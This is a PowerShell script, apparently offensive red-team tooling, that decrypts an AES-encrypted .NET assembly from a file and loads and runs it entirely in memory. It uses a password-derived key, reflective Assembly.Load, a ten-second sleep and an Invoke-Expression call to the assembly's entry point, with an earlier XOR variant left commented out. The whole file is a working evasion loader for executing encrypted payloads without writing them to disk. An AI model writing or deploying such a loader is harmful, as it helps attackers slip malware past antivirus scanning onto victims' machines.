$enc = [System.Text.Encoding]::UTF8


function aes_dec {
    param (
        [string]$EncryptedFilePath,
        [string]$Password
    )
    
    # Read encrypted data
    $base64String = (Get-Content -Path $EncryptedFilePath)
    $fullBytes = [System.Convert]::FromBase64String($base64String)

    # Extract salt, IV, and ciphertext
    $salt = $fullBytes[0..15]
    $iv = $fullBytes[16..31]
    $cipherBytes = $fullBytes[32..($fullBytes.Length - 1)]

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $keyDeriver = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
    $aes.Key = $keyDeriver.GetBytes(32)
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)

    return $plainBytes
}



function Invoke-LoadAssemblyAESLocal
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $AssemblyPath,
        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $KeyString,
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $Command
        )

    #$xorb64_bin = (Get-Content -Path $AssemblyPath)
    #[Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $KeyString))

    [Byte[]]$AssemblyBytes = (aes_dec $AssemblyPath $KeyString)

    $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)

    Start-Sleep -Seconds 10

    $ep = $assembly.EntryPoint
    $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
    echo $ldrcommand
    Invoke-Expression $ldrcommand
}